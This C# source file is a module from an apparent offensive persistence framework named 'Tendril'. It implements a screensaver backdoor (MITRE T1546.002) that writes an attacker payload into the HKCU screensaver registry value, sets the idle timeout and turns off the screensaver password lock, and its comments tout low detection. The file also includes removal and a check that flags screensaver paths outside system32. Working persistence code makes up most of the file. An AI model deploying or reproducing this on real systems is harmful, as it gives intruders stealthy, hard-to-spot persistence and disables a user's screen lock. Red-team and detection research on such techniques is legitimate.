using System;
using System.Collections.Generic;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// Screensaver Backdoor (T1546.002)
    ///
    /// Sets the screensaver executable to the attacker payload via HKCU registry.
    /// When the screensaver activates (idle timeout), the payload runs in the
    /// current user's context. No admin required.
    ///
    /// Low detection surface because screensaver settings are rarely monitored.
    /// Works best with a renamed .scr (which is just a PE) or a path to an EXE.
    /// </summary>
    public class ScreensaverBackdoor : ITendril
    {
        public string Name { get { return "ScreensaverBackdoor"; } }
        public string Description { get { return "Screensaver hijack - payload runs on idle timeout"; } }
        public string MitreId { get { return "T1546.002"; } }
        public bool RequiresAdmin { get { return false; } }
        public bool IsReconOnly { get { return false; } }

        private const string RegPath = @"Control Panel\Desktop";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string payload, timeout;
            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name,
                    "Missing required option: /payload:<path_to_scr_or_exe>");

            if (!options.TryGetValue("timeout", out timeout))
                timeout = "600"; // 10 minutes default

            // Back up current screensaver setting
            string currentScr = RegistryUtils.GetRegValue("HKCU", RegPath, "SCRNSAVE.EXE");

            RegistryUtils.SetRegValue("HKCU", RegPath, "SCRNSAVE.EXE", payload);
            RegistryUtils.SetRegValue("HKCU", RegPath, "ScreenSaveActive", "1");
            RegistryUtils.SetRegValue("HKCU", RegPath, "ScreenSaveTimeOut", timeout);
            // Disable password requirement to avoid locking operator out
            RegistryUtils.SetRegValue("HKCU", RegPath, "ScreenSaverIsSecure", "0");

            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("Screensaver set to: {0} (timeout: {1}s)", payload, timeout))
                .WithMeta("Payload", payload)
                .WithMeta("Timeout", timeout)
                .WithMeta("PreviousScreensaver", currentScr ?? "none");
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string restore;
            if (!options.TryGetValue("restore", out restore))
                restore = ""; // clear it

            if (string.IsNullOrEmpty(restore))
            {
                RegistryUtils.DeleteRegValue("HKCU", RegPath, "SCRNSAVE.EXE");
                RegistryUtils.SetRegValue("HKCU", RegPath, "ScreenSaveActive", "0");
            }
            else
            {
                RegistryUtils.SetRegValue("HKCU", RegPath, "SCRNSAVE.EXE", restore);
            }

            return new TendrilResult(ResultStatus.Success, Name, "Screensaver persistence removed");
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();

            string scrExe = RegistryUtils.GetRegValue("HKCU", RegPath, "SCRNSAVE.EXE");
            string active = RegistryUtils.GetRegValue("HKCU", RegPath, "ScreenSaveActive");
            string timeout = RegistryUtils.GetRegValue("HKCU", RegPath, "ScreenSaveTimeOut");

            if (!string.IsNullOrEmpty(scrExe))
            {
                // Flag if screensaver points to something outside system32
                bool suspicious = !scrExe.ToLower().Contains(@"\windows\system32\");

                results.Add(new TendrilResult(
                    suspicious ? ResultStatus.Warning : ResultStatus.Info,
                    Name,
                    string.Format("Screensaver: {0} (active={1}, timeout={2}s)", scrExe, active, timeout))
                    .WithMeta("SCRNSAVE.EXE", scrExe)
                    .WithMeta("ScreenSaveActive", active ?? "unset")
                    .WithMeta("ScreenSaveTimeOut", timeout ?? "unset")
                    .WithMeta("Suspicious", suspicious.ToString()));
            }
            return results;
        }
    }
}
